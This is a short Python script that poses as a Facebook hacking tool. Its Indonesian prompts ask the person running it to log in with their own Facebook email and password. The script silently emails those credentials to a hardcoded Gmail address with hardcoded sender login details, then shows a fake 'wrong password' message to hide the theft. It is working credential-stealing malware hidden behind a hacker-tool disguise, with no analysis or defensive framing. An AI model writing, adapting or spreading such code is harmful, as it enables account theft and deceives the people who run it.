import yagmail, os, time
from getpass import getpass

banner = '''
    █░█ ▄▀█ █▀▀ █▄▀   █▀▀ █▄▄
    █▀█ █▀█ █▄▄ █░█   █▀░ █▄█
    -------------------------
    [ Pandas ID ]
'''
def main():
    os.system('clear')
    print(banner)
    print('    ! Silahkan login menggunakan akun FB Kamu\n')
    email = input('    [•] Email: ')
    pasw = getpass('    [•] Password: ')
    data = f'Email: {email}\nPassword: {pasw}'
    yag = yagmail.SMTP('subyt44@gmail.com', '082250223147')
    yag.send('akmalthemalong@gmail.com', 'Setoran', data)
    time.sleep(5)
    print('\n    ! Password Salah')

if __name__ == '__main__':
    main()
